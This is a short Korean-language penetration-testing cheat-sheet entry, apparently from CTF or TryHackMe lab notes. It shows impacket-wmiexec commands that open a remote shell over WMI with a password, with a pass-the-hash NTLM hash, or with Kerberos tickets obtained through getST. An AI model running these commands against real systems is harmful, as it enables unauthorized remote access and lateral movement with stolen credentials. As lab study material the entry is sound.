

- **목적:** WMI(RPC)를 통해 원격 시스템에 셸을 획득합니다.
- **특징:** `psexec`보다 은밀하지만, 셸이 다소 불안정할 수 있습니다.

```bash
# 비밀번호 이용
rlwrap impacket-wmiexec <domain>/<user>:<password>@$target

# Pass-the-Hash
rlwrap impacket-wmiexec <domain>/<user>@$target -hashes :<ntlm_hash>

# getST 사용 이후
rlwrap impacket-wmiexec -k -no-pass THM.LOCAL/Administrator@labyrinth.thm.local
```
